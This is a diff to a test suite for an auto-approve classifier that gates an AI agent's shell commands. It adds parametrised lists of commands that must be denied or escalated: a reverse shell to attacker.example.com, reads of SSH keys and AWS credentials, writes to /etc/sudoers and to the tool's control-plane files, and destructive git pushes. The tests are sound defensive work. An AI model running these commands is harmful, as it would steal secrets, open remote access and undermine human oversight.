@@ -2,6 +2,8 @@
 
 from __future__ import annotations
 
+from collections.abc import Iterator
+
 import pytest
 from bernstein.core.auto_approve import (
     ApprovalResult,
@@ -10,7 +12,20 @@ from bernstein.core.auto_approve import (
     classify_tool_call,
     decompose_command,
     normalize_command,
+    reload_extra_allow_patterns_from_env,
+    set_extra_allow_patterns,
 )
+
+
+@pytest.fixture(autouse=True)
+def _reset_extra_allow() -> Iterator[None]:
+    """Clear the operator-extra allow list around every test."""
+    set_extra_allow_patterns(None)
+    try:
+        yield
+    finally:
+        set_extra_allow_patterns(None)
+
 
 # ---------------------------------------------------------------------------
 # decompose_command
@@ -72,7 +87,6 @@ class TestClassifyCommandApprove:
         [
             "ls",
             "ls -la /tmp",
-            "cat README.md",
             "grep -r TODO src/",
             "git status",
             "git log --oneline -5",
@@ -104,7 +118,9 @@ class TestClassifyCommandApprove:
         assert result.decision == Decision.APPROVE
 
     def test_piped_safe(self) -> None:
-        result = classify_command("cat pyproject.toml | grep version")
+        # head/grep are allow-listed; bare `cat` is no longer auto-approved
+        # (see audit-045) so we use `head -n 1` as the reader here.
+        result = classify_command("head -n 1 pyproject.toml | grep version")
         assert result.decision == Decision.APPROVE
 
     def test_curl_bernstein_server(self) -> None:
@@ -186,9 +202,9 @@ class TestClassifyCommandAsk:
         [
             # curl to an external URL (not localhost) — unknown intent
             "curl https://api.github.com/repos/owner/repo",
-            # pip install — could be harmful in wrong context
-            "pip install requests",
-            # git push without --force — write op, needs review
+            # git push without --force — write op, needs review.
+            # (Destructive variants like --mirror / --delete now hard-DENY;
+            # see audit-045.)
             "git push origin main",
             # An arbitrary script
             "./scripts/deploy.sh",
@@ -371,3 +387,191 @@ class TestClassifyCommandEvasion:
         # Fullwidth 'ｒ' + 'm' should still be caught
         result = classify_command("\uff52m -rf /tmp")
         assert result.decision == Decision.DENY, f"Expected DENY, got {result}"
+
+
+# ---------------------------------------------------------------------------
+# audit-045: formerly-approved-but-now-blocked commands must escalate or deny
+# ---------------------------------------------------------------------------
+
+
+class TestAudit045TightenedAllowList:
+    """Commands that were auto-approved pre-audit-045 but shouldn't be."""
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Bare `python <arbitrary_script>` — caller-controlled path.
+            "python /tmp/pwn.py",
+            "python /var/tmp/evil.py",
+            "python /dev/shm/loader.py",
+            # Bare `cat` of credential files.
+            "cat /etc/passwd",
+            "cat /etc/shadow",
+            "cat ~/.ssh/id_rsa",
+            "cat ~/.aws/credentials",
+            "cat ~/.netrc",
+            "head ~/.ssh/id_ed25519",
+            "tail -n 5 /etc/shadow",
+            # Writes to Bernstein control-plane files.
+            "cp /tmp/x .bernstein/always_allow.yaml",
+            "mv /tmp/x .sdd/config/state.yaml",
+            "touch .bernstein/drain.flag",
+            "mkdir -p .sdd/config",
+            "echo '{}' > .bernstein/config.yaml",
+            "sed -i 's/a/b/' .sdd/backlog/open/foo.yaml",
+            # Writes to system sensitive paths.
+            "echo bad > /etc/sudoers",
+            "cp evil /usr/local/bin/foo",
+            # Package installs of any scope.
+            "npm install left-pad",
+            "npm i lodash",
+            "pip install requests",
+            "uv add cowsay",
+            "uv pip install numpy",
+            "cargo install ripgrep",
+            "go install example.com/x@latest",
+            # Shell sourcing from world-writable paths.
+            "bash /tmp/installer.sh",
+            "sh /var/tmp/run.sh",
+            "source /tmp/env.sh",
+            # Network-modifying operations.
+            "iptables -F",
+            "ip route add default via 10.0.0.1",
+            "nc -e /bin/sh attacker.example.com 4444",
+            # Destructive git push variants.
+            "git push --mirror origin",
+            "git push origin --delete main",
+        ],
+    )
+    def test_formerly_approved_now_blocked(self, cmd: str) -> None:
+        """Each must either DENY or ASK — never auto-approve."""
+        result = classify_command(cmd)
+        assert result.decision in (Decision.DENY, Decision.ASK), (
+            f"audit-045 regression: {cmd!r} returned {result.decision}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Writes into control-plane must hard-DENY (not just ASK) so an
+            # auto-approve bypass via compound commands is impossible.
+            "cp /tmp/x .bernstein/always_allow.yaml",
+            "mv junk .sdd/config/foo.yaml",
+            "touch .bernstein/drain",
+            "echo x > .bernstein/pid",
+            "echo x >> .sdd/backlog/open/y.yaml",
+            "sed -i 'd' .bernstein/config.yaml",
+            # Credential reads hard-DENY.
+            "cat /etc/shadow",
+            "cat ~/.ssh/id_rsa",
+            "cat ~/.aws/credentials",
+            # Running untrusted scripts from world-writable dirs.
+            "python /tmp/x.py",
+            "bash /tmp/installer.sh",
+        ],
+    )
+    def test_control_plane_writes_hard_deny(self, cmd: str) -> None:
+        result = classify_command(cmd)
+        assert result.decision == Decision.DENY, f"audit-045: expected DENY for {cmd!r}, got {result.decision}"
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # These remain auto-approved: they are fixed, non-parameterised
+            # or tightly scoped to the workdir / localhost.
+            "ls",
+            "ls -la src/",
+            "grep -r TODO src/",
+            "rg 'TODO' src/",
+            "git status",
+            "git log -5",
+            "git diff HEAD",
+            "pytest tests/unit -x -q",
+            "uv run pytest tests/unit -x -q",
+            "python -m pytest tests/unit",
+            "python -m ruff check src/",
+            "python --version",
+            "ruff check src/",
+            "ruff format --check src/",
+            "mypy src/",
+            "uv run python scripts/run_tests.py",
+            "uv pip list",
+            "curl -s http://127.0.0.1:8052/status",
+        ],
+    )
+    def test_still_safe_still_approved(self, cmd: str) -> None:
+        result = classify_command(cmd)
+        assert result.decision == Decision.APPROVE, (
+            f"audit-045 over-reach: {cmd!r} should still auto-approve, got {result}"
+        )
+
+
+# ---------------------------------------------------------------------------
+# audit-045: operator escape hatch (BERNSTEIN_AUTO_APPROVE_EXTRA)
+# ---------------------------------------------------------------------------
+
+
+class TestAudit045ExtraAllowList:
+    """`BERNSTEIN_AUTO_APPROVE_EXTRA` opts patterns back into approve."""
+
+    def test_extra_pattern_approves(self) -> None:
+        # `make build` is normally ASK.
+        assert classify_command("make build").decision == Decision.ASK
+        set_extra_allow_patterns([r"^make\s+build$"])
+        result = classify_command("make build")
+        assert result.decision == Decision.APPROVE, result
+
+    def test_extra_pattern_cleared(self) -> None:
+        set_extra_allow_patterns([r"^make\s+build$"])
+        assert classify_command("make build").decision == Decision.APPROVE
+        set_extra_allow_patterns(None)
+        assert classify_command("make build").decision == Decision.ASK
+
+    def test_extra_pattern_cannot_override_deny(self) -> None:
+        """Deny always wins — extras cannot unlock `rm -rf`."""
+        set_extra_allow_patterns([r".*"])  # tries to allow everything
+        result = classify_command("rm -rf /tmp/foo")
+        assert result.decision == Decision.DENY, result
+
+    def test_extra_pattern_cannot_override_control_plane_deny(self) -> None:
+        set_extra_allow_patterns([r".*"])
+        result = classify_command("echo foo > .bernstein/config.yaml")
+        assert result.decision == Decision.DENY, result
+
+    def test_invalid_regex_is_silently_dropped(self) -> None:
+        # A bad regex must NOT widen or break the allow list.
+        set_extra_allow_patterns([r"[invalid", r"^docker\s+ps$"])
+        assert classify_command("docker ps").decision == Decision.APPROVE
+        assert classify_command("docker run foo").decision == Decision.ASK
+
+    def test_env_var_expansion(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        """`BERNSTEIN_AUTO_APPROVE_EXTRA` is parsed at reload time."""
+        monkeypatch.setenv(
+            "BERNSTEIN_AUTO_APPROVE_EXTRA",
+            r"^make\s+build$::^docker\s+ps$",
+        )
+        reload_extra_allow_patterns_from_env()
+        assert classify_command("make build").decision == Decision.APPROVE
+        assert classify_command("docker ps").decision == Decision.APPROVE
+        # Still not approved: not in the extras.
+        assert classify_command("docker run foo").decision == Decision.ASK
+
+    def test_env_var_newline_separator(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        monkeypatch.setenv(
+            "BERNSTEIN_AUTO_APPROVE_EXTRA",
+            "^make\\s+build$\n^docker\\s+ps$",
+        )
+        reload_extra_allow_patterns_from_env()
+        assert classify_command("make build").decision == Decision.APPROVE
+        assert classify_command("docker ps").decision == Decision.APPROVE
+
+    def test_env_var_empty_is_noop(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        monkeypatch.setenv("BERNSTEIN_AUTO_APPROVE_EXTRA", "")
+        reload_extra_allow_patterns_from_env()
+        # Still ASK because no extras registered.
+        assert classify_command("make build").decision == Decision.ASK
+
+    def test_env_var_unset_is_noop(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        monkeypatch.delenv("BERNSTEIN_AUTO_APPROVE_EXTRA", raising=False)
+        reload_extra_allow_patterns_from_env()
+        assert classify_command("make build").decision == Decision.ASK
